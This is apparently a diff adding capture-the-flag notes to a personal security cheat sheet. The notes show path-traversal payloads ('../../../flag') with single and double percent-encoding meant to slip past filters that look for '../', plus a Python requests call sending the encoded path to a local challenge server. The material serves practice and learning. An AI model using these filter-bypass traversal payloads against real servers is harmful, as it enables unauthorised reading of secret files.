@@ -85,3 +85,29 @@ $(< "$FILE")
 ; ===============  Web Security
 ; ===============    (Aka intro to command injection - html injection - sql injection )
 
+; When Its GET request I like to use google!
+; ../../../flag
+https://www.google.com/search?q=..%2F..%2F..%2Fflag
+; to trick the server for reading the secret file
+
+; Encoding "../../flag" --to--> "..%2F..%2F..%2Fflag" WITH Python
+;
+; Encoding ../ as %2e%2e%2f gets it past curl and past filters that look for ../.
+; Python's urllib.parse.quote never encodes "." (it is unreserved), so do it by hand.
+enc(s)                                     # url-encode every byte of a string in python, dots too  @percent-encoding @urlencode @quote @dot-dot-slash  <https://docs.python.org/3/library/urllib.parse.html#urllib.parse.quote>
+    def enc(s):
+        return "".join(f"%{b:02x}" for b in s.encode())
+    single = enc("../../../flag")   # %2e%2e%2f%2e%2e%2f%2e%2e%2f%66%6c%61%67
+    double = enc(single)            # %25%32%65%25%32%65...
+
+p.replace(".", "%2e").replace("/", "%2f")  # single-encode only ../ in python, keep the file name readable  @path-traversal @urlencode
+    p = "../../../flag"
+    single = p.replace(".", "%2e").replace("/", "%2f")   # %2e%2e%2f%2e%2e%2f%2e%2e%2fflag
+
+single.replace("%", "%25")                 # double-encode an already encoded path in python  @path-traversal @double-encoding
+    double = single.replace("%", "%25")                  # %252e%252e%252f%252e%252e%252fflag
+
+requests.get(URL)                          # send an encoded path from python, requests keeps %2e as is  @http @get @path-traversal  <https://requests.readthedocs.io/en/latest/user/quickstart/>
+    import requests
+    r = requests.get(f"http://challenge.localhost/payload/{single}")
+    print(r.status_code, r.text)
